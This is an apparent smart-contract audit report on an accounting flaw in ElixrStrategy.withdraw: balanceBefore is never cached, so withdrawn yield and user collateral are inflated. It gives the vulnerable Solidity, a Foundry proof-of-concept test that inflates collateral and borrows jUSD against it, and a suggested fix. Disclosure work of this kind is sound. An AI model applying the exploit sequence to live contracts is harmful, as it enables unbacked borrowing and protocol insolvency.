## **Vulnerability Details**

Users can go through the sequence of `HoldingManager.deposit -> StrategyManager.invest -> Strategy.deposit -> StrategyManager.claimInvestment -> Strategy.withdraw` to claim yield from specific strategies.

In the case of the `ElixrStrategy`, the yield, represented as USDT (`tokenIn`), will be transferred to the user through the aforementioned call sequence.

The issue arises during the `ElixrStrategy.withdraw` call flow, where `params.balanceBefore` for the `tokenIn` is not cached prior to the swap from `deUSD` to `USDT` via a Uniswap pool. This allows a malicious user to inflate their yield, which will then be added to their `collateral[holding]` mapping state variable and artificially increasing the actual collateral amount they possess in their holding.

This flaw affects the entire accounting of `collateral[holding]` maintained by users and can lead to several consequences, such as:

1. Users are guaranteed more collateral to withdraw.
2. They can borrow more jUSD without any actual collateral backing it, as they virtually inflate their USDT accounting in the `collateral[holding]` mapping stored in the SharesRegistry of USDT.
3. They can repeatedly execute the above call flow to artificially inflate their collateral balance, preventing successful liquidations.

Consequently, the protocol may ultimately face insolvency.

In `ElixrStrategy.withdraw`

```solidity
function withdraw(
        uint256 _shares,
        address _recipient,
        address _asset,
        bytes calldata _data
    ) external override nonReentrant onlyStrategyManager returns (uint256, uint256, int256, uint256) {
        require(_asset == tokenIn, "3001");

        WithdrawParams memory params = WithdrawParams({
            shares: _shares,
            totalShares: recipients[_recipient].totalShares,
            shareRatio: 0,
            shareDecimals: sharesDecimals,
            investment: 0,
            assetsToWithdraw: 0,
            balanceBefore: 0,
            withdrawnAmount: 0,
            yield: 0,
            fee: 0
        });

        params.shareRatio = OperationsLib.getRatio({
            numerator: params.shares,
            denominator: params.totalShares,
            precision: params.shareDecimals,
            rounding: OperationsLib.Rounding.Floor
        });

        _burn({
            _receiptToken: receiptToken,
            _recipient: _recipient,
            _shares: params.shares,
            _totalShares: params.totalShares,
            _tokenDecimals: params.shareDecimals
        });

        params.investment = (recipients[_recipient].investedAmount * params.shareRatio) / 10 ** params.shareDecimals;
        uint256 deUsdBalanceBefore = IERC20(deUSD).balanceOf(address(this));

        _genericCall({
            _holding: _recipient,
            _contract: tokenOut,
            _call: abi.encodeCall(ISdeUsdMin.unstake, (address(this)))
        });

        uint256 deUsdAmount = IERC20(deUSD).balanceOf(address(this)) - deUsdBalanceBefore;

        // Swap deUSD to USDT on Uniswap
        _swapExactInputMultihop({
            _tokenIn: deUSD,
            _amountIn: deUsdAmount,
            _recipient: _recipient,
            _swapData: _data,
            _swapDirection: SwapDirection.ToTokenIn
        });

        // Take protocol's fee from generated yield if any.
@>        params.withdrawnAmount = IERC20(tokenIn).balanceOf(_recipient) - params.balanceBefore; //@audit balanceBefore is 0 here, it is not first cached before hand
        params.yield = params.withdrawnAmount.toInt256() - params.investment.toInt256();

        // Take protocol's fee from generated yield if any.
        if (params.yield > 0) {
            params.fee = _takePerformanceFee({ _token: tokenIn, _recipient: _recipient, _yield: uint256(params.yield) });
            if (params.fee > 0) {
                params.withdrawnAmount -= params.fee;
                params.yield -= params.fee.toInt256();
            }
        }

        recipients[_recipient].totalShares -= _shares;
        recipients[_recipient].investedAmount = params.investment > recipients[_recipient].investedAmount
            ? 0
            : recipients[_recipient].investedAmount - params.investment;

        emit Withdraw({
            asset: _asset,
            recipient: _recipient,
            shares: params.shares,
            withdrawnAmount: params.withdrawnAmount,
            initialInvestment: params.investment,
            yield: params.yield
        });

        // Register `_recipient`'s withdrawal operation to stop generating jigsaw rewards.
        jigsawStaker.withdraw({ _user: _recipient, _amount: _shares });

        return (params.withdrawnAmount, params.investment, params.yield, params.fee);
    }
```

## **POC**

The below POC demonstrates that with a principal of 10k USDT deposited, he successfullly inflated his collateral balance by ~7.65k worth of USDT which he can subsequently use to borrow more JUSD.

He has 8.65k worth of USDT but still manages to borrow using 8k USDT as he inflated his collateral balance when withdrawing yield via ElixrStrategy

To run the test

1. Add the test `test_elixr_withdraw_tokenIn_wrong_before_balance` to `ElixrStrategy_fork.t.sol`
2. run `forge test --mt test_elixr_withdraw_tokenIn_wrong_before_balance -vv`



```solidity
    function test_elixr_withdraw_tokenIn_wrong_before_balance() public notOwnerNotZero(user) {
        // uint256 amount = bound(_amount, 1e6, 1e8);

        uint256 amount = 10_000e6;
        address userHolding = initiateUser(user, tokenIn, amount);

        // Get amount invested
        uint256 investAmount = 1000e6; 
        bytes memory data = abi.encode(
            investAmount * DECIMAL_DIFF, // amountOutMinimum
            uint256(block.timestamp), // deadline
            abi.encodePacked(tokenIn, poolFee, USDC, poolFee, deUSD)
        );


        // Invest into the tested strategy via strategyManager
        vm.prank(user, user);
        strategyManager.invest(tokenIn, address(strategy), investAmount, 0, data);

        (, uint256 totalShares) = strategy.recipients(userHolding);
        uint256 tokenInBalanceBefore = IERC20(tokenIn).balanceOf(userHolding);

        _transferInRewards(100_000e18);
        skip(90 days);

        vm.prank(user, user);
        strategy.cooldown(userHolding, totalShares);
        skip(7 days);

        bytes memory dataClaimInvest = abi.encode(
            investAmount, // amountOutMinimum
            uint256(block.timestamp), // deadline
            abi.encodePacked(deUSD, poolFee, USDC, poolFee, tokenIn)
        );

        vm.prank(user, user);
        (uint256 assetAmount,,,) = strategyManager.claimInvestment({
            _holding: userHolding,
            _token: tokenIn,
            _strategy: address(strategy),
            _shares: totalShares,
            _data: dataClaimInvest
        });

        
        (, address shareRegistryTokenIn) = stablesManager.shareRegistryInfo(tokenIn);
        uint256 tokenInBalance = ISharesRegistry(shareRegistryTokenIn).collateral(userHolding);

        // User's collateral balance after investment claimed is way more than his principal amount 10_000e6 deposited
        // These are collateral that do not even exist in the holding contract and is inflated via the StrategyManager.claimInvestment -> ElixrStrategy.withdraw call
        console.log("User's actual balance of tokenIn in holding contract", IERC20(tokenIn).balanceOf(userHolding));
        console.log("User's balance after investment claimed ", tokenInBalance);
        console.log("Inflated tokenIn amount", tokenInBalance - amount);

        vm.startPrank(user);

        uint256 collateralUsedForBorrowing = 8000e6; // 8000e6 worth of USDT is borrowed. Under non inflated circumstances, solvency checks will revert this borrowing call
        IHoldingManager holdingManager = IHoldingManager(address(manager.holdingManager()));
        holdingManager.borrow(tokenIn, collateralUsedForBorrowing, 0, false);
        uint256 borrowedAmount = ISharesRegistry(shareRegistryTokenIn).borrowed(userHolding);
        console.log("User's JUSD amount", borrowedAmount);

        vm.stopPrank();
    }
```

## **Root Cause**

In `ElixrStrategy.withdraw`, the `params.balanceBefore`, which indicates the holding balance prior to the swap for `deUSD`, is not adequately stored.

## **Impact**

Internal accounting breaks, Protocol insolvency.

## **Mitigation**

Consider first caching the `params.balanceBefore` for the token before doing the swap for deUSD in `ElixrStrategy.withdraw`